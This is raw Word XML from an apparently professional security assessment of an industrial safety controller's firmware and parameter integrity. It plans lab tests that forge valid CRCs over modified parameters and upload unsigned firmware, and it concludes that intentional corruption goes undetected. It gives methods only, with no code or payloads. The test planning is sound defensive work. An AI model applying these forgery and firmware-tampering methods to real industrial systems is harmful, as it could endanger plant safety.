      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-3 (runtime blind spot — keep).</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Dual-SCPU cross-check + STL detect </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>divergent/random</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> faults but are </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>blind to a coherent modification applied identically to both channels</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — exactly what a signed-image mechanism would catch. This is </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>why</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> self-tests ≠ authenticity. </w:t>
      </w:r>
      <w:hyperlink r:id="rId123" w:history="1">
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1E3429C8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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Cross-reference note (not re-imported):</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authenticity of reported identification data</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (unsigned HTTP version strings, MITM-falsifiable) is weak — but that is a </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>reporting-integrity</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> issue tied to RQ-004's confidentiality/identification limb, not a corruption of the software itself. Noted, not tested here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52339CBF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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SL/conformance conclusion (integrity-scoped):</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-005 is </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>partially met.</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Part B</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> reaches integrity at </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SL 1 (accidental)</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, not the intentional-corruption level (no MAC). </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Part D</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> has </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>runtime/redundancy protection</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (dual-SCPU + STL, detecting random/divergent faults) but </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no cryptographic authenticity</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EDR 3.10, EDR 3.14, EDR 3.12/3.13 unmet</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → intentional firmware corruption is not prevented at the device level. Net: </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>protection against accidental corruption achieved; protection against intentional corruption not achieved</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — with the </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authorization</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of updates assessed separately under </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-011</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211122FB" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:pict w14:anchorId="6E8C50B0">
          <v:rect id="_x0000_i1286" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="2977B7A0" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61" w:rsidP="00D04F61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Step 2 — Methodological Test Planning (Scope-Corrected)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3024"/>
        <w:gridCol w:w="2039"/>
        <w:gridCol w:w="2291"/>
        <w:gridCol w:w="626"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="7C9D3D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CC30B1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74DFA6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B4CC20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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61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07EC40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 xml:space="preserve">Scientific </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61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FF1A35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SVV</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="5A7B9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1B27C" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61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92207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Verify </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> rejection of a mismatched configuration (references TC-RQ002-01)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B3E5C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>Functional CR 3.4 in normal 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424C4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t>Requirements-based</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>verification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3348C5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SVV-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="54F14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495BE" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61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17942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Recompute </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>valid</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> over </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>modified</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> parameters; inject → accepted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5ADA5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rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Proves</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> G-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> (Part B: intentional </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>corruption</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>undetected</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61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37685" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve">MITRE ATT&amp;CK </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>for</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> ICS </w:t>
            </w:r>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>T0836</w:t>
            </w:r>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:i/>
                <w:iCs/>
              </w:rPr>
              <w:t>Modify Parameter</w:t>
            </w:r>
            <w:r w:rsidRPr="00D04F61">
              <w:t>; NIST SP 800-115 §5.2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6B598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SVV-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="4EDF4C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9BFC2" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61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E4426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Upload a </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>modified/unsigned firmware BLOB</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">; confirm </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no signature/integrity verification</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> before install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95B5E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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Proves G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (Part D: no update authenticity — decisive)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2FEC3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OWASP </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ISTG-FW[UPDT]-CRYPT-001/004</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">; OWASP FSTM Stage 7; MITRE </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>T0857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461F9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SVV-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="6670E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3EDEE" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61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BC025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>Obtain the update image/BLOB; static analysis for signature/header + binary-hardening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70883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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Characterises</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> absence of signing / secure-boot artefacts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E3E7D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OWASP FSTM Stage 3–5; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ifm</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>CM-008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02465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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="33E52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8988A9" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:del w:id="16" w:author="Unknown">
              <w:r w:rsidRPr="00D04F61">
                <w:delText>TS-5 — Update access-control gate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C667A" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61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4412B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Moved → RQ-011</w:t>
            </w:r>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>authorization</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61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4E95B" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61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946FC" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>—</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="78F7B856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i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(Note: entering Update state — switch 999 + reboot — is a </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>precondition</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for TS-3, executed operationally; </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">whether that gate correctly restricts who may update is </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>tested under RQ-011</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, not here. TS-3 tests only whether the image is verified once accepted.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5267A976" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Environment binding: TS-2 side-inject on Pi eth0; TS-3/TS-4 over the management path. TS-3 modifies safety firmware → </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>isolated-lab, PLC-monitored, spare-DUT</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> only; re-flash with a validated image afterward. </w:t>
      </w:r>
      <w:hyperlink r:id="rId124" w:history="1">
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00D04F61">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId125" w:history="1">
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D04F61">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6DDCF532" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:pict w14:anchorId="18005A6A">
          <v:rect id="_x0000_i1287" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B77D7E" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61" w:rsidP="00D04F61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Step 3 — Two-Level Test Catalog (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A562E34" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Full entries for the Part-B forgery proof (TS-2) and the decisive Part-D unsigned-firmware proof (TS-3). TS-1 references TC-RQ002-01; TS-4 follows the FSTM template on request. </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>TC-RQ005-05 (access-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>control</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>gate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>removed</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> → RQ-011.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47375C27" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:pict w14:anchorId="60994C54">
          <v:rect id="_x0000_i1288" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D72726" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61" w:rsidP="00D04F61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TC-RQ005-02 — Valid-CRC Forgery over Modified Parameters (Part B / G-1 proof)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2605B49F" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61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7756"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="77ED3F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EF0D1B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D69A60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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="6B50A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41771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42949" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
